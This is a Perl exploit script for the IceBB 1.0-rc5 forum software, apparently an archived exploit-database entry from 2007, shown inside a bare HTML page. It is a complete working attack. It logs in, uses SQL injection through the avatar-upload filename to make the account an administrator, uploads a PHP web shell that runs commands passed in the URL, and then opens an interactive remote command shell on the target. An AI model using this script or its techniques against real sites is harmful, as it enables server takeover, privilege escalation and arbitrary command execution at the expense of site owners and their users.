<html><head><title>IceBB 1.0-rc5 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#  IceBB 1.0-rc5 Remote Code Execution Exploit
#  1. register a user
#  2. run this exploit with this usage : $perl xpl.pl [host&amp;path] [uname] [pass]
#  3. login with admin access :)
#
#
#### Coded &amp; Discovered By Hessam-x / Hessamx-at-Hessamx.net

use LWP::UserAgent;
use HTTP::Cookies;

$port = &quot;80&quot;;
 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = &quot;http://&quot;.$host;

 print q(
 ###########################################################
 #          IceBB 1.0-rc5 Remote Code Exec Exploit         #
 #                    www.Hessamx.Net                      #
 ################# (C)oded By Hessam-x #####################

);


 if (@ARGV &lt; 3) {
 print &quot; #  usage : xpl.pl [host&amp;path] [uname] [pass]\n&quot;;
 print &quot; #  e.g : xpl.pl www.milw0rm.com/icebb/ str0ke 123456\n&quot;;
 exit();
 }

   print &quot; [~] User/Password : $uname/$passwd \n&quot;;
   print &quot; [~] Host : $host \n&quot;;

 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();

 $xpl-&gt;cookie_jar( $cookie_jar );


$login = $xpl-&gt;post($url.'index.php',
Content =&gt; [
 'act' =&gt; 'login',
'from' =&gt; 'index.php',
'user' =&gt; $uname,
'pass' =&gt; $passwd,
'func' =&gt; 'Login',
],);

 if($cookie_jar-&gt;as_string =~ /icebb_sessid=(.*?);/) {
       $cookie = $1;
   print &quot; [~] Logined ...\n&quot;;
 } else {
 print &quot; [-] Can not Login In $host !\n&quot;;
 exit();
 }

 $badcode = &quot;', user_group='1&quot;;
 $avata = $xpl-&gt;post($url.'index.php',Content_Type =&gt; 'form-data',
 Content =&gt; [
 'avtype'  =&gt; 'upload',
 'act' =&gt; 'ucp',
 'func' =&gt; 'avatar',
 'file'   =&gt; [
              undef,
              'avatar.jpg'.$badcode,
              Content_type =&gt; 'text/plain',
              Content =&gt; 'MYAVATAR',
             ],
 'submit'        =&gt; 'Save',
 ],
 );
 $avat = $xpl-&gt;post($url.'index.php',Content_Type =&gt; 'form-data',
 Content =&gt; [
 'avtype'  =&gt; 'upload',
 'act' =&gt; 'ucp',
 'func' =&gt; 'avatar',
 'file'   =&gt; [
              undef,
              'shell.php'.$badcode,
              Content_type =&gt; 'text/plain',
              Content =&gt; '&lt;? echo 1 ; echo _START_ ; system(\$_GET[\'cmd\']); echo _END_ ; ?&gt;',
             ],
 'submit'        =&gt; 'Save',
 ],
 );
 $test = $xpl-&gt;get($url.'index.php');
if($test-&gt;as_string =~ /Admin Control Center/) {
print &quot; [+] You Are admin Now ! \n&quot;;
} else {
print &quot; [-] Exploit Failed ! \n&quot;;
exit();
}
if($test-&gt;as_string =~ /profile=(.*?)'&gt;/) {
 $uid = $1;
print &quot; [~] User id : $1 \n&quot;;
} else {
print &quot; [?] please enter user id : &quot;;
     chomp($uid=&lt;STDIN&gt;);
}

   while ()
{
     print &quot;\n[Shell - type 'exit' for exit]\$ &quot;;
     chomp($exc=&lt;STDIN&gt;);
    &amp;sys($exc);
}
sub sys($exc) {
     if ($exc eq 'exit') { exit() ; }
 $res = $xpl-&gt;get($url.'uploads/av-'.$uid.'.php?cmd='.$exc);
 @result = split(/\n/,$res-&gt;content);
 $runned = 0;
 $on = 0;
 for $res(@result) {
   if ($res =~ /^_END_/) { print &quot;\n&quot;; return 0; }
   if ($on == 0) { print &quot;  $res\n&quot;; }
   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }
 }
   if (!$runned) { print &quot;\n Can not execute command . EXPLOIT FAILED !\n&quot; ; exit(); };

 }


print &quot;\n #################################################### \n&quot;;

# milw0rm.com [2007-03-26]</pre></html>